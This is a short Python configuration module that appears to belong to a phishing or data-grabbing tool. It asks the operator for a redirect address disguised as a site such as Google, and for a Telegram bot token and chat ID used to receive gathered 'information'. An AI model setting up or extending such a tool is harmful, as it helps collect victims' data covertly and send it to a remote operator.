from modules import loading

def configServer():
    redirectUrl = loading.inputPlus("Enter the redirect address (Ex: https://google.com, None = our defaullt Url)")
    if (redirectUrl):
        redirectName = loading.inputPlus("Enter the redirect name (Ex: Google, None = our defaullt name)")

    if(redirectUrl and redirectName):
        loading.server.serverConfig(redirectName, redirectUrl)

    if (redirectUrl == ""):
        loading.server.serverConfig()

    if(redirectUrl and redirectName == ""):
        redirectName = "any Site"
        loading.server.serverConfig(redirectName,redirectUrl)

def configTokenBot():
    accept = loading.inputPlus("Do You want Yse telegram bot for Get information (y => yes, n => no)")
    if(accept == "y"):
        botToken = loading.inputPlus("Enter the Telegram Bot Token (if You save before Enter None)")
        if (botToken and botToken != "None"):
            with open("userInfo/botToken", "w") as bot:
                bot.write(botToken)
        chatId = loading.inputPlus("Enter the Telegram cahtId (if You save before Enter None)")
        if (chatId and chatId != "None"):
            with open("userInfo/chatId", "w") as bot:
                bot.write(chatId)
        return True
    else:
        return False

